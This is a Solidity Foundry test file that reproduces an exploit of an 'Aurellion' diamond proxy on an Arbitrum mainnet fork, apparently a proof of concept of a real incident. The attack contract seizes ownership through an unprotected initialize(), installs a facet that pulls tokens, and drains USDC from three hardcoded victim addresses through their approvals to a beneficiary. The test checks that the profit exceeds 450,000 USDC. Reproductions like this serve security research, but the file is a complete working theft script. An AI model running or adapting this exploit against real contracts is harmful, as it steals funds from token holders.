// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20Aurellion {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IAurellionDiamond {
    enum FacetCutAction {
        Add,
        Replace,
        Remove
    }

    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }

    function initialize(address owner) external;
    function diamondCut(FacetCut[] calldata cut, address init, bytes calldata data) external;
}

contract AurellionPullFacet {
    function pullERC20(address token, address from, uint256 amount) external {
        require(IERC20Aurellion(token).transferFrom(from, address(this), amount), "pull failed");
    }

    function sweepERC20(address token, address recipient) external {
        uint256 amount = IERC20Aurellion(token).balanceOf(address(this));
        require(IERC20Aurellion(token).transfer(recipient, amount), "sweep failed");
    }
}

contract ArbAurellionDiamondInitAttack {
    address internal constant DIAMOND = 0x0Adc63e71B035d5c7FDB1B4593999FA1F296f1B2;
    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;

    address internal constant VICTIM_1 = 0x2e933518068b1CFC9746d94762Ef2EDDD39c6048;
    address internal constant VICTIM_2 = 0xa90714a15D6e5C0EB3096462De8dc4B22E01589A;
    address internal constant VICTIM_3 = 0xEceD2D37e5EDCFc67ffB74c655416F893d20793E;

    address public immutable beneficiary;
    AurellionPullFacet public immutable facet;

    constructor(address beneficiary_) {
        require(beneficiary_ != address(0), "beneficiary is zero");
        beneficiary = beneficiary_;
        facet = new AurellionPullFacet();
    }

    function executeAttack() external {
        IAurellionDiamond diamond = IAurellionDiamond(DIAMOND);

        diamond.initialize(address(this));

        bytes4[] memory selectors = new bytes4[](2);
        selectors[0] = AurellionPullFacet.pullERC20.selector;
        selectors[1] = AurellionPullFacet.sweepERC20.selector;

        IAurellionDiamond.FacetCut[] memory cut = new IAurellionDiamond.FacetCut[](1);
        cut[0] = IAurellionDiamond.FacetCut({
            facetAddress: address(facet),
            action: IAurellionDiamond.FacetCutAction.Add,
            functionSelectors: selectors
        });

        diamond.diamondCut(cut, address(0), "");

        _pullAvailable(VICTIM_1);
        _pullAvailable(VICTIM_2);
        _pullAvailable(VICTIM_3);

        (bool ok, ) = DIAMOND.call(abi.encodeWithSelector(AurellionPullFacet.sweepERC20.selector, USDC, address(this)));
        require(ok, "sweep from diamond failed");

        uint256 amount = IERC20Aurellion(USDC).balanceOf(address(this));
        require(IERC20Aurellion(USDC).transfer(beneficiary, amount), "beneficiary transfer failed");
    }

    function _pullAvailable(address victim) internal {
        uint256 amount = IERC20Aurellion(USDC).balanceOf(victim);
        if (amount == 0) return;

        (bool ok, ) = DIAMOND.call(abi.encodeWithSelector(AurellionPullFacet.pullERC20.selector, USDC, victim, amount));
        require(ok, "pull failed");
    }
}

interface IERC20AurellionTest {
    function balanceOf(address account) external view returns (uint256);
}

contract Exploit19cbAurellionDiamondInitTest is Test {
    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    uint256 internal constant FORK_BLOCK_BEFORE_EXPLOIT = 462_014_666;
    uint256 internal constant MIN_EXPECTED_PROFIT = 450_000e6;

    address internal attacker = makeAddr("ordinary-eoa-attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("ARBITRUM_RPC_URL"), FORK_BLOCK_BEFORE_EXPLOIT);
        vm.deal(attacker, 10 ether);
    }

    function test_selfImplementedDiamondInitializeAllowancePull() external {
        IERC20AurellionTest usdc = IERC20AurellionTest(USDC);
        uint256 attackerBefore = usdc.balanceOf(attacker);

        vm.startPrank(attacker, attacker);
        ArbAurellionDiamondInitAttack attack = new ArbAurellionDiamondInitAttack(attacker);
        attack.executeAttack();
        vm.stopPrank();

        uint256 profit = usdc.balanceOf(attacker) - attackerBefore;
        emit log_named_decimal_uint("attacker_usdc_profit", profit, 6);

        assertGt(profit, MIN_EXPECTED_PROFIT, "USDC pull did not reproduce incident size");
    }
}
